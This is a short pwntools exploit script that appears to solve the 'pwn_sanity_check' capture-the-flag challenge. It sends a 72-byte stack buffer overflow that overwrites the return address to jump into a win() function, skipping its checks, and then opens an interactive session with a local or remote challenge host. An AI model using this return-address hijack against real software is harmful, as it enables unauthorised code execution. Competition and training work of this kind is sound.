#!/usr/bin/env python3
from pwn import *

LOCAL=True

binary = "./pwn_sanity_check"

context.binary = binary

if LOCAL:
	p = process(binary)
else:
	p = remote("dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io", 7480)

# Overflow buffer 
payload = b"A" * 72  		# 60 bytes for buffer, 4 for local integer, and 8 for rbp
payload += p64(0x4006cf)	# bypass parameter checks in win() function

p.readuntil("tell me a joke\n")
p.sendline(payload)

p.interactive()
